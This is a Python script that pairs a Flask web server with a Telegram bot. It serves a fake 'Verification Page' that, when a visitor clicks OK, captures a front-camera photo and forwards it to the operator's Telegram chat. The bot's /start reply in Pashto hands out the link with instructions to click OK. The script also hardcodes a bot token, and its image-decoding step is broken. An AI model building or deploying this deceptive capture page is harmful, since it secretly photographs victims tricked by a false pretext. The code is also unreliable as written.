import os
from flask import Flask, request, render_template_string
from telegram import Bot, Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# =====================
# CONFIG
# =====================
BOT_TOKEN = "7975528068:AAHVLLbZpLSSEhTjXbrmZ4keOS0kPesy7zw"
CHAT_ID = None   # automatically set
PORT = 8080

bot = Bot(BOT_TOKEN)
app = Flask(__name__)

# =====================
# WEB PAGE
# =====================
HTML = """
<!DOCTYPE html>
<html>
<head>
<title>Verification</title>
</head>
<body style="text-align:center;font-family:sans-serif">
<h2>Verification Page</h2>
<button onclick="openCam()">OK</button>
<br><br>
<video id="video" autoplay style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
function openCam(){
 navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
 .then(stream=>{
  let v=document.getElementById("video");
  v.srcObject=stream;
  v.style.display="block";
  setTimeout(()=>take(v,stream),2000);
 });
}
function take(v,stream){
 let c=document.getElementById("canvas");
 c.width=v.videoWidth;
 c.height=v.videoHeight;
 c.getContext("2d").drawImage(v,0,0);
 stream.getTracks().forEach(t=>t.stop());
 fetch("/upload",{
  method:"POST",
  body:c.toDataURL("image/jpeg")
 }).then(()=>alert("Done"));
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/upload", methods=["POST"])
def upload():
    global CHAT_ID
    data = request.data.decode().split(",")[1]
    img = bytes.fromhex(data.encode().hex())
    with open("selfie.jpg","wb") as f:
        f.write(img)
    bot.send_photo(chat_id=CHAT_ID, photo=open("selfie.jpg","rb"))
    return "ok"

# =====================
# TELEGRAM
# =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CHAT_ID
    CHAT_ID = update.effective_chat.id
    link = f"http://127.0.0.1:{PORT}"
    await update.message.reply_text(
        f"سلام 👋\n\nدا ستا لینک دی:\n{link}\n\nلینک خلاص کړه او OK کلیک کړه"
    )

def run_flask():
    app.run(host="0.0.0.0", port=PORT)

# =====================
# MAIN
# =====================
if __name__ == "__main__":
    import threading
    threading.Thread(target=run_flask).start()

    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.run_polling()
